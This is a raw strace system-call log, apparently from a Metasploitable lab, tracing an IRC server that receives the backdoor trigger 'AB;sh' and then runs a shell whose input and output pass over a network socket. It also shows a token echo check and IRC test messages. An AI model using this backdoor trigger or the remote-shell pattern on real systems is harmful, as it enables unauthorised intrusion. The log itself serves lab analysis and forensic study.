+29842 15:04:56.665450 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.665461 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0
+29842 15:04:56.665473 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.665484 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0
+29842 15:04:56.665496 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.665516 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.665528 close(1)          = -1 EBADF (Bad file descriptor)
+29842 15:04:56.665538 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29842 15:04:56.665601 exit_group(0)     = ?
+29846 15:04:56.665622 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.665637 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.665648 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.665660 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+29846 15:04:56.665674 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+29846 15:04:56.665692 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.665704 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.665717 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.665730 read(0, "C", 1)   = 1
+29846 15:04:56.665742 read(0, "o", 1)   = 1
+29846 15:04:56.665752 read(0, "n", 1)   = 1
+29846 15:04:56.665761 read(0, "n", 1)   = 1
+29846 15:04:56.665771 read(0, "e", 1)   = 1
+29846 15:04:56.665781 read(0, "c", 1)   = 1
+29846 15:04:56.665790 read(0, "t", 1)   = 1
+29846 15:04:56.665800 read(0, "e", 1)   = 1
+29846 15:04:56.665810 read(0, "d", 1)   = 1
+29846 15:04:56.665819 read(0, " ", 1)   = 1
+29846 15:04:56.665829 read(0, "t", 1)   = 1
+29846 15:04:56.665838 read(0, "o", 1)   = 1
+29846 15:04:56.665848 read(0, " ", 1)   = 1
+29841 15:04:56.665876 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 29842
+29841 15:04:56.665891 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29841 15:04:56.665902 --- SIGCHLD (Child exited) @ 0 (0) ---
+29841 15:04:56.665909 waitpid(-1, 0xbfeddcc8, WNOHANG) = -1 ECHILD (No child processes)
+29841 15:04:56.665919 sigreturn()       = ? (mask now [])
+29841 15:04:56.665935 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+29841 15:04:56.665977 exit_group(0)     = ?
+29839 15:04:56.666007 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 29841
+29839 15:04:56.666019 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29839 15:04:56.666074 --- SIGCHLD (Child exited) @ 0 (0) ---
+29839 15:04:56.666081 waitpid(-1, 0xbfd2e928, WNOHANG) = -1 ECHILD (No child processes)
+29839 15:04:56.666120 sigreturn()       = ? (mask now [])
+29839 15:04:56.666151 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+29839 15:04:56.666208 exit_group(0)     = ?
+4519  15:04:56.666240 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 29839
+4519  15:04:56.666252 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
+4519  15:04:56.666266 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
+4519  15:04:56.666277 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+4519  15:04:56.666286 --- SIGCHLD (Child exited) @ 0 (0) ---
+4519  15:04:56.666304 send(5, ":irc.Metasploitable.LAN 451 AB;sh :You have not registered\r\n", 60, 0) = 60
+4519  15:04:56.666353 gettimeofday({1495652696, 666358}, NULL) = 0
+4519  15:04:56.666368 select(1024, [2 3 4 5 6 9], [], NULL, {1, 0} <unfinished ...>
+29846 15:04:56.666431 read(0, "1", 1)   = 1
+29846 15:04:56.666442 read(0, "0", 1)   = 1
+29846 15:04:56.666452 read(0, ".", 1)   = 1
+29846 15:04:56.666480 read(0, "0", 1)   = 1
+29846 15:04:56.666580 read(0, ".", 1)   = 1
+29846 15:04:56.666591 read(0, "2", 1)   = 1
+29846 15:04:56.666600 read(0, ".", 1)   = 1
+29846 15:04:56.666610 read(0, "4", 1)   = 1
+29846 15:04:56.666619 read(0, ".", 1)   = 1
+29846 15:04:56.666629 read(0, "\n", 1)  = 1
+29846 15:04:56.666653 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.666673 stat64("/sbin/Connected", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.666686 stat64("/bin/Connected", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.666702 stat64("/usr/sbin/Connected", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.666714 stat64("/usr/bin/Connected", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.666727 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29846 15:04:56.666741 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e0c6f8) = 29849
+29849 15:04:56.666791 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29849 15:04:56.666807 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29849 15:04:56.666820 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29849 15:04:56.666832 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29849 15:04:56.666847 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29849 15:04:56.666863 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29849 15:04:56.666876 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29849 15:04:56.666931 write(2, "sh: line 2: Connected: command not found\n", 41) = 41
+29848 15:04:56.666946 <... select resumed> ) = 1 (in [0])
+29848 15:04:56.666954 read(0, "sh: line 2: Connected: command not found\n", 8154) = 41
+29848 15:04:56.666969 select(8, [0 7], [7], [7], {0, 0}) = 1 (out [7], left {0, 0})
+29848 15:04:56.666985 send(7, "sh: line 2: Connected: command not found\r\n", 42, 0) = 42
+29848 15:04:56.667075 select(8, [0 7], [], [7], {0, 0}) = 0 (Timeout)
+29848 15:04:56.667103 select(8, [0 7], [], [7], NULL <unfinished ...>
+29849 15:04:56.667251 exit_group(127)   = ?
+29845 15:04:56.667288 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29845 15:04:56.667308 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29845 15:04:56.667336 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29845 15:04:56.667347 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29845 15:04:56.667360 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+29845 15:04:56.667373 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+29845 15:04:56.667391 waitpid(-1,  <unfinished ...>
+29846 15:04:56.667405 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.667416 --- SIGCHLD (Child exited) @ 0 (0) ---
+29846 15:04:56.667424 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 29849
+29846 15:04:56.667437 waitpid(-1, 0xbfced2e8, WNOHANG) = -1 ECHILD (No child processes)
+29846 15:04:56.667447 sigreturn()       = ? (mask now [])
+29846 15:04:56.667467 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.667481 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.667492 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.667552 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+29846 15:04:56.667583 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+29846 15:04:56.667612 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.667622 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.667636 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.667648 read(0, "E", 1)   = 1
+29846 15:04:56.667659 read(0, "s", 1)   = 1
+29846 15:04:56.667669 read(0, "c", 1)   = 1
+29846 15:04:56.667679 read(0, "a", 1)   = 1
+29846 15:04:56.667688 read(0, "p", 1)   = 1
+29846 15:04:56.667698 read(0, "e", 1)   = 1
+29846 15:04:56.667708 read(0, " ", 1)   = 1
+29846 15:04:56.667717 read(0, "c", 1)   = 1
+29846 15:04:56.667727 read(0, "h", 1)   = 1
+29846 15:04:56.667736 read(0, "a", 1)   = 1
+29846 15:04:56.667746 read(0, "r", 1)   = 1
+29846 15:04:56.667755 read(0, "a", 1)   = 1
+29846 15:04:56.667765 read(0, "c", 1)   = 1
+29846 15:04:56.667775 read(0, "t", 1)   = 1
+29846 15:04:56.667784 read(0, "e", 1)   = 1
+29846 15:04:56.667794 read(0, "r", 1)   = 1
+29846 15:04:56.667803 read(0, " ", 1)   = 1
+29846 15:04:56.667813 read(0, "i", 1)   = 1
+29846 15:04:56.667823 read(0, "s", 1)   = 1
+29846 15:04:56.667832 read(0, " ", 1)   = 1
+29846 15:04:56.667842 read(0, "\'", 1)  = 1
+29846 15:04:56.667851 read(0, "^", 1)   = 1
+29846 15:04:56.667861 read(0, "]", 1)   = 1
+29846 15:04:56.667870 read(0, "\'", 1)  = 1
+29846 15:04:56.667880 read(0, ".", 1)   = 1
+29846 15:04:56.667893 read(0, "\n", 1)  = 1
+29846 15:04:56.667915 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+29846 15:04:56.667935 stat64("/sbin/Escape", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.667947 stat64("/bin/Escape", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.667958 stat64("/usr/sbin/Escape", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.667971 stat64("/usr/bin/Escape", 0xbfced668) = -1 ENOENT (No such file or directory)
+29846 15:04:56.667983 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+29846 15:04:56.667996 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e0c6f8) = 29850
+29850 15:04:56.668073 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29850 15:04:56.668103 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29850 15:04:56.668116 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29850 15:04:56.668128 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+29850 15:04:56.668143 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29850 15:04:56.668158 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29850 15:04:56.668171 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+29850 15:04:56.668224 write(2, "sh: line 3: Escape: command not found\n", 38) = 38
+29848 15:04:56.668239 <... select resumed> ) = 1 (in [0])
+29848 15:04:56.668247 read(0, "sh: line 3: Escape: command not found\n", 8113) = 38
+29848 15:04:56.668261 select(8, [0 7], [7], [7], {0, 0}) = 1 (out [7], left {0, 0})
+29848 15:04:56.668277 send(7, "sh: line 3: Escape: command not found\r\n", 39, 0) = 39
+29848 15:04:56.668365 select(8, [0 7], [], [7], {0, 0}) = 0 (Timeout)
+29848 15:04:56.668393 select(8, [0 7], [], [7], NULL <unfinished ...>
+29850 15:04:56.668503 exit_group(127)   = ?
+29846 15:04:56.674602 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.674618 --- SIGCHLD (Child exited) @ 0 (0) ---
+29846 15:04:56.674627 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 29850
+29846 15:04:56.674640 waitpid(-1, 0xbfced2e8, WNOHANG) = -1 ECHILD (No child processes)
+29846 15:04:56.674651 sigreturn()       = ? (mask now [])
+29846 15:04:56.674673 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.674688 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.674699 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+29846 15:04:56.674711 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+29846 15:04:56.674725 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+29846 15:04:56.674740 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.674751 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+29846 15:04:56.674764 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29846 15:04:56.674777 read(0,  <unfinished ...>
+29844 15:04:56.916502 <... select resumed> ) = 1 (in [7])
+29848 15:04:56.916585 <... select resumed> ) = 1 (in [7])
+29844 15:04:56.916594 recv(7,  <unfinished ...>
+29848 15:04:56.916606 recv(7,  <unfinished ...>
+29844 15:04:56.916611 <... recv resumed> "echo xkgivHiG7aQzaxWn;\n", 8191, 0) = 23
+29848 15:04:56.916624 <... recv resumed> "echo xkgivHiG7aQzaxWn;\n", 8191, 0) = 23
+29844 15:04:56.916632 select(8, [0 7], [1], [7], {0, 0} <unfinished ...>
+29848 15:04:56.916646 select(8, [0 7], [1], [7], {0, 0} <unfinished ...>
+29844 15:04:56.916653 <... select resumed> ) = 1 (out [1], left {0, 0})
+29848 15:04:56.916665 <... select resumed> ) = 1 (out [1], left {0, 0})
+29844 15:04:56.916672 write(1, "echo xkgivHiG7aQzaxWn;\n", 23 <unfinished ...>
+29846 15:04:56.916685 <... read resumed> "e", 1) = 1
+29848 15:04:56.916692 write(1, "echo xkgivHiG7aQzaxWn;\n", 23 <unfinished ...>
+29844 15:04:56.916698 <... write resumed> ) = 23
+29846 15:04:56.916708 read(0,  <unfinished ...>
+29848 15:04:56.916712 <... write resumed> ) = 23
+29844 15:04:56.916717 select(8, [0 7], [], [7], {0, 0} <unfinished ...>
+29846 15:04:56.916727 <... read resumed> "c", 1) = 1
+29848 15:04:56.916733 select(8, [0 7], [], [7], {0, 0} <unfinished ...>
+29844 15:04:56.916739 <... select resumed> ) = 0 (Timeout)
+29846 15:04:56.916755 read(0,  <unfinished ...>
+29848 15:04:56.916759 <... select resumed> ) = 0 (Timeout)
+29844 15:04:56.916764 select(8, [0 7], [], [7], NULL <unfinished ...>
+29846 15:04:56.916773 <... read resumed> "h", 1) = 1
+29848 15:04:56.916779 select(8, [0 7], [], [7], NULL <unfinished ...>
+29846 15:04:56.916787 read(0, "o", 1)   = 1
+29846 15:04:56.916798 read(0, " ", 1)   = 1
+29846 15:04:56.916808 read(0, "x", 1)   = 1
+29846 15:04:56.916818 read(0, "k", 1)   = 1
+29846 15:04:56.916827 read(0, "g", 1)   = 1
+29846 15:04:56.916837 read(0, "i", 1)   = 1
+29846 15:04:56.916847 read(0, "v", 1)   = 1
+29846 15:04:56.916857 read(0, "H", 1)   = 1
+29846 15:04:56.916867 read(0, "i", 1)   = 1
+29846 15:04:56.916877 read(0, "G", 1)   = 1
+29846 15:04:56.916886 read(0, "7", 1)   = 1
+29846 15:04:56.916896 read(0, "a", 1)   = 1
+29846 15:04:56.916906 read(0, "Q", 1)   = 1
+29846 15:04:56.916916 read(0, "z", 1)   = 1
+29846 15:04:56.916925 read(0, "a", 1)   = 1
+29846 15:04:56.916935 read(0, "x", 1)   = 1
+29846 15:04:56.916945 read(0, "W", 1)   = 1
+29846 15:04:56.916955 read(0, "n", 1)   = 1
+29846 15:04:56.916964 read(0, ";", 1)   = 1
+29846 15:04:56.916974 read(0, "\n", 1)  = 1
+29846 15:04:56.917014 write(1, "xkgivHiG7aQzaxWn\n", 17 <unfinished ...>
+29848 15:04:56.917024 <... select resumed> ) = 1 (in [0])
+29846 15:04:56.917030 <... write resumed> ) = 17
+29848 15:04:56.917108 read(0,  <unfinished ...>
+29846 15:04:56.917116 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+29848 15:04:56.917124 <... read resumed> "xkgivHiG7aQzaxWn\n", 8075) = 17
+29846 15:04:56.917131 <... rt_sigprocmask resumed> [], 8) = 0
+29848 15:04:56.917143 select(8, [0 7], [7], [7], {0, 0} <unfinished ...>
+29846 15:04:56.917150 read(0,  <unfinished ...>
+29848 15:04:56.917157 <... select resumed> ) = 1 (out [7], left {0, 0})
+29848 15:04:56.917168 send(7, "xkgivHiG7aQzaxWn\r\n", 18, 0) = 18
+29848 15:04:56.917226 select(8, [0 7], [], [7], {0, 0}) = 0 (Timeout)
+29848 15:04:56.917255 select(8, [0 7], [], [7], NULL <unfinished ...>
+4519  15:04:57.024964 <... select resumed> ) = 1 (in [4], left {0, 640000})
+4519  15:04:57.024964 clock_gettime(CLOCK_MONOTONIC, {29506, 841973405}) = 0
+4519  15:04:57.024964 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
+4519  15:04:57.024965 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024965 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024965 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024965 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024966 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024966 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024966 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024966 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024977 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.024992 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025006 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025020 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025034 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025048 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025062 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025076 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025089 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025103 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025129 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025153 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025168 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025182 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.025200 time(NULL)        = 1495652697
+4519  15:04:57.025211 time(NULL)        = 1495652697
+4519  15:04:57.025228 gettimeofday({1495652697, 25233}, NULL) = 0
+4519  15:04:57.025241 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+4519  15:04:57.025271 clock_gettime(CLOCK_MONOTONIC, {29506, 842283747}) = 0
+4519  15:04:57.025281 gettimeofday({1495652697, 25285}, NULL) = 0
+4519  15:04:57.025292 select(1024, [2 3 4 5 6 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 110000})
+4519  15:04:57.920091 clock_gettime(CLOCK_MONOTONIC, {29507, 737111383}) = 0
+4519  15:04:57.920113 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
+4519  15:04:57.920128 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+4519  15:04:57.920151 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
+4519  15:04:57.920238 --- SIGPIPE (Broken pipe) @ 0 (0) ---
+4519  15:04:57.920289 close(5)          = 0
+4519  15:04:57.920304 gettimeofday({1495652697, 920309}, NULL) = 0
+4519  15:04:57.920318 select(1024, [2 3 4 6 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 940000})
+4519  15:04:57.974949 clock_gettime(CLOCK_MONOTONIC, {29507, 791958168}) = 0
+4519  15:04:57.974950 recv(6, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
+4519  15:04:57.974976 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.974994 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975009 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975024 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975038 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975052 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975066 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975081 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975094 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975108 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975122 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975136 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975150 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975164 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975178 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975192 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975206 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975220 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975234 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975249 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975263 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975277 getrusage(RUSAGE_SELF, {ru_utime={0, 100000}, ru_stime={1, 590000}, ...}) = 0
+4519  15:04:57.975293 time(NULL)        = 1495652697
+4519  15:04:57.975303 time(NULL)        = 1495652697
+4519  15:04:57.975323 gettimeofday({1495652697, 975329}, NULL) = 0
+4519  15:04:57.975337 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+4519  15:04:57.975373 clock_gettime(CLOCK_MONOTONIC, {29507, 792386769}) = 0
+4519  15:04:57.975384 gettimeofday({1495652697, 975388}, NULL) = 0
+4519  15:04:57.975395 select(1024, [2 3 4 6 9], [], NULL, {1, 0} <unfinished ...>
